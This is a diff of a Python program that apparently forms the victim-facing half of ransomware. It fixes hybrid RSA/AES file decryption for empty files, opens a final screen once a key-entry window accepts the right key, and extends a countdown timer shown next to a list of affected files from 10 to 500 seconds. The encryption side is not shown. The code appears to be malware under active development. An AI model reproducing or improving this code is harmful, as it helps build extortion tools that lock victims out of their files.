@@ -65,7 +65,11 @@ def dec(cipher, in_filename, out_filename=None):
         e_data = infile.read()
 
         # RSA : 파일의 크기와 암호화된 AES 키 추출
-        size_of_data = int(e_data[:11].lstrip(b'0').decode())
+        size_of_data = e_data[:11].lstrip(b'0').decode()
+        #크기가 0 바이트일 때
+        if(size_of_data == ''):
+            size_of_data = '0'
+        size_of_data = int(size_of_data)
         aes_key_enc = e_data[11:139]  # 암호화된 aes 키 (128바이트)
 
         # RSA : 암호화된 진짜 원본 데이터 추출
@@ -263,11 +267,11 @@ class MyTk:
         self.l_input.config(text=" The keys are being checked ... ")
         self.pwbutton.config(state='disabled')
 
-        self.parent and self.parent.checkPassword(self.pw)
-
-        self.pwbutton.config(state='normal')
-        #self.pwbutton['state'] = 'normal'
-        self.l_input.config(text=" It's the wrong key.")
+        if (self.parent and self.parent.checkPassword(self.pw)):
+            self.finalGui()
+        else:
+            self.pwbutton.config(state='normal')
+            self.l_input.config(text=" It's the wrong key.")
 
 
 
@@ -341,7 +345,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 10, antdd_filelist)
+    clock(gui, 500, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -445,8 +449,7 @@ class RealMain:
                         dec(PKCS1_OAEP.new(RSA.importKey(key.strip())), dec_target, out_filename=None)
                         os.remove(dec_target)
 
-                    self.myGui.finalGui()
-                    #self.myGui.window.destroy()
+                    return True
 
 
 
